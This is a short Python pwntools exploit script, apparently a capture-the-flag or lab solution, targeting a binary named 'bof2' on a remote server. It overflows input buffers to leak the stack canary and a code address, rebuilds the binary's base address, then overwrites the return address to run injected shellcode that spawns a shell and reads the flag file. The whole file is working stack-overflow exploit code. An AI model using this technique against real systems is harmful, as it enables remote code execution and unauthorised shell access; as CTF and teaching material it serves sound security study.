#!/usr/bin/env python

from pwn import process, remote, u64, p64, context, asm, shellcraft, ELF

context.arch = "amd64"
context.os = "linux"
context.endian = "little"

# r = process("./bof2")
r = remote("up.zoolab.org", 10259)

r.sendafter(b"name? ", b"A" * 0x29)

r.recvuntil(b"A" * 0x29)
canary = u64(b"\x00" + r.recv(7))


r.sendafter(b"number? ", b"A" * 0x38)

r.recvuntil(b"A" * 0x38)
main_addr = u64(r.recv(6) + b"\x00\x00")

bof2 = ELF("./bof2")
bof2.address = main_addr - bof2.sym["main"] - 0xA0


r.sendafter(b"name? ", b"A" * 0x28 + p64(canary) + b"B" * 8 + p64(bof2.sym["msg"]))
r.sendafter(b"message: ", asm(shellcraft.sh()))

r.recvuntil(b"Thank you!\n")

r.sendline(b"cat /FLAG")


flag = r.recvuntil(b"}")
print(flag.decode())

r.close()
